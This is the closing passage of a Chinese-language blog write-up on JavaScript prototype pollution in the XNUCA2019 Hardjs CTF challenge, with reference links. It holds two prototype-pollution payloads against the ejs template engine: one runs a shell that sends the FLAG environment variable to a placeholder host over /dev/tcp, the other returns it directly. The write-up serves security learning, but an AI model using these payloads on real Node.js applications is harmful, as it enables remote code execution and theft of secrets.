<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;test&quot;,&quot;content&quot;:&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:</span><br><span class="line">&#123;&quot;outputFunctionName&quot;:&quot;a&#x3D;1;process.mainModule.require(&#39;child_process&#39;).exec(&#39;b</span><br><span class="line">ash -c \&quot;echo $FLAG&gt;&#x2F;dev&#x2F;tcp&#x2F;xxxxx&#x2F;xx\&quot;&#39;)&#x2F;&#x2F;&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>è§£æ³•äºŒçš„payload: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;client&quot;: true,&quot;escapeFunction&quot;: &quot;1; return</span><br><span class="line">process.env.FLAG&quot;,&quot;debug&quot;:true, &quot;compileDebug&quot;: true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>è¯¦ç»†å‚è€ƒå®˜æ–¹wp</p>
<p>å‚è€ƒWP: </p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6113">https://xz.aliyun.com/t/6113</a></p>
<p><a target="_blank" rel="noopener" href="https://lihuaiqiu.github.io/2019/09/25/XNUCA2019-Hardjs/">https://lihuaiqiu.github.io/2019/09/25/XNUCA2019-Hardjs/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bdwms.com/?p=525">https://www.bdwms.com/?p=525</a></p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ifonlyddw/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs">https://gitee.com/ifonlyddw/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs</a> (å®˜æ–¹wp, ä¸è¿‡æˆ‘cloneåˆ°äº†ç äº‘,è¿™æ ·æ›´å¿«ä¸€ç‚¹)</p>
<h1 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03    æ€»ç»“"></a>0x03    æ€»ç»“</h1><p><strong>ä¸ç§¯è·¬æ­¥æ— ä»¥è‡³åƒé‡Œ</strong></p>
<p>åé¢æœ‰æ—¶é—´å¯ä»¥å¤šæ‰¾ç‚¹è¿™ç§é¢˜åˆ·ä¸€åˆ·,,, è‡ªå·±å®¡ä¸€å®¡,,, èŠ±äº†ä¸€ä¸Šåˆå’Œä¸€ä¸‹åˆ, å€¼äº†!!! æ€»ç®—æ˜¯å¯¹åŸå‹é“¾æ±¡æŸ“æœ‰ç‚¹å°è±¡äº†!</p>
<p>ç»§ç»­åŠªåŠ›</p>
<p>å…³äºè¿™ä¸ªæ¼æ´, æœ‰ç‚¹å’Œpop é“¾çš„æ„é€ ç›¸ä¼¼, å¯èƒ½å› ä¸ºéƒ½å±äºé¢å‘å¯¹è±¡, å½“ç„¶å…³äºè¿™ä¸€å—çš„æ¼æ´è¿˜æœ‰å¾ˆå¤š, å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« </p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/12659738.html">https://www.cnblogs.com/20175211lyz/p/12659738.html</a></p>
<h1 id="0x04-å‚è€ƒèµ„æ–™"><a href="#0x04-å‚è€ƒèµ„æ–™" class="headerlink" title="0x04    å‚è€ƒèµ„æ–™"></a>0x04    å‚è€ƒèµ„æ–™</h1><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">ç»§æ‰¿ä¸åŸå‹é“¾</a></p>
<p><a target="_blank" rel="noopener" href="https://www.smi1e.top/javascript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Smi1eå¸ˆå‚…çš„æ–‡ç« </a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">PğŸ®çš„æ–‡ç« </a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/176884">https://www.anquanke.com/post/id/176884</a></p>
<p><a target="_blank" rel="noopener" href="https://meizjm3i.github.io/2018/09/11/JavaScript_Prototype_Pollution/">https://meizjm3i.github.io/2018/09/11/JavaScript_Prototype_Pollution/</a> ç”±æµ…å…¥æ·±, å¹¶è®²è§£äº†ä¾‹é¢˜</p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/755/#hard-thejs">https://paper.seebug.org/755/#hard-thejs</a>  ä¸€ç¯‡writeup å¯ä»¥çœ‹çœ‹æ€è·¯â€¦.Orz</p>
<p><a target="_blank" rel="noopener" href="https://medium.com/better-programming/prototypes-in-javascript-5bba2990e04b">https://medium.com/better-programming/prototypes-in-javascript-5bba2990e04b</a></p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/fe9/basic/zk5e4f">https://www.yuque.com/fe9/basic/zk5e4f</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bdwms.com/?p=525">https://www.bdwms.com/?p=525</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bdwms.com/?p=525">æ·±å…¥ç†è§£prototype proto å’Œ constructor çš„å…³ç³»</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/710f.html">https://hack-for.fun/710f.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB/">åŸå‹é“¾æ±¡æŸ“æ”»å‡»</a><a class="post-meta__tags" href="/tags/Node-js/">Node.js</a><a class="post-meta__tags" href="/tags/JavaScript/">JavaScript</a></div><div class="post_share"><div class="social-share" data-image="/null" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/b3d1.html"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Windows10 ç¥èˆŸU47T1 è£…Macos</div></div></a></div><div class="next-post pull-right"><a href="/a703.html"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">å†…ç½‘æ¸—é€åˆçº§å­¦ä¹ ç¬”è®°(ä¸€)-æ¸—é€æµ‹è¯•æµç¨‹</div></div></a></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/null" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">m0nk3y</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">97</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">81</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">22</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">0x00    å‰ç½®åŸºç¡€çŸ¥è¯†</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E4%B8%8E%E7%BB%A7%E6%89%BF"><span class="toc-number">1.1.</span> <span class="toc-text">åŸå‹é“¾ä¸ç»§æ‰¿</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF"><span class="toc-number">1.2.</span> <span class="toc-text">åŸºäºåŸå‹é“¾çš„ç»§æ‰¿</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E5%B1%9E%E6%80%A7"><span class="toc-number">1.2.1.</span> <span class="toc-text">ç»§æ‰¿å±æ€§</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">ç»§æ‰¿æ–¹æ³•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8E%9F%E5%9E%8B"><span class="toc-number">1.2.3.</span> <span class="toc-text">ä½¿ç”¨åŸå‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1%E5%92%8C%E7%94%9F%E6%88%90%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">1.2.4.</span> <span class="toc-text">åˆ›å»ºå¯¹è±¡å’Œç”ŸæˆåŸå‹é“¾</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">0x01 åŸå‹é“¾æ±¡æŸ“æ”»å‡»</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Hacking-in-CTF"><span class="toc-number">3.</span> <span class="toc-text">0x02    Hacking in CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XNUCA2019-Hardjs"><span class="toc-number">3.1.</span> <span class="toc-text">XNUCA2019 Hardjs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.1.1.</span> <span class="toc-text">ä¿¡æ¯æœé›†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.1.2.</span> <span class="toc-text">æ¼æ´æ¢æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">3.1.3.</span> <span class="toc-text">æ¼æ´éªŒè¯</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#js%E5%8E%9F%E5%9E%8B%E9%93%BE%E5%88%B0RCE"><span class="toc-number">3.1.3.1.</span> <span class="toc-text">jsåŸå‹é“¾åˆ°RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ejs-%E8%BF%9B%E8%A1%8C-rce"><span class="toc-number">3.1.3.2.</span> <span class="toc-text">åˆ©ç”¨ejs è¿›è¡Œ rce</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">0x03    æ€»ç»“</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">5.</span> <span class="toc-text">0x04    å‚è€ƒèµ„æ–™</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2986.html" title="Recent arrangements"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Recent arrangements"/></a><div class="content"><a class="title" href="/2986.html" title="Recent arrangements">Recent arrangements</a><time datetime="2099-11-01T04:00:00.000Z" title="Created 2099-11-01 12:00:00">2099-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/9b1d.html" title="No title"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="No title"/></a><div class="content"><a class="title" href="/9b1d.html" title="No title">No title</a><time datetime="2099-10-31T16:00:00.000Z" title="Created 2099-11-01 00:00:00">2099-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/62d1.html" title="Chrome æµè§ˆå™¨æ‰©å±•å¼€å‘åˆè¯•"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Chrome æµè§ˆå™¨æ‰©å±•å¼€å‘åˆè¯•"/></a><div class="content"><a class="title" href="/62d1.html" title="Chrome æµè§ˆå™¨æ‰©å±•å¼€å‘åˆè¯•">Chrome æµè§ˆå™¨æ‰©å±•å¼€å‘åˆè¯•</a><time datetime="2020-11-07T05:04:25.000Z" title="Created 2020-11-07 13:04:25">2020-11-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/558a.html" title="Cobalt Strike"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cobalt Strike"/></a><div class="content"><a class="title" href="/558a.html" title="Cobalt Strike">Cobalt Strike</a><time datetime="2020-11-04T13:33:44.000Z" title="Created 2020-11-04 21:33:44">2020-11-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/abc8.html" title="2020å°ç»„æ‹›æ–°æœ‰æ„Ÿ"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2020å°ç»„æ‹›æ–°æœ‰æ„Ÿ"/></a><div class="content"><a class="title" href="/abc8.html" title="2020å°ç»„æ‹›æ–°æœ‰æ„Ÿ">2020å°ç»„æ‹›æ–°æœ‰æ„Ÿ</a><time datetime="2020-10-23T16:56:04.000Z" title="Created 2020-10-24 00:56:04">2020-10-24</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 By m0nk3y</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>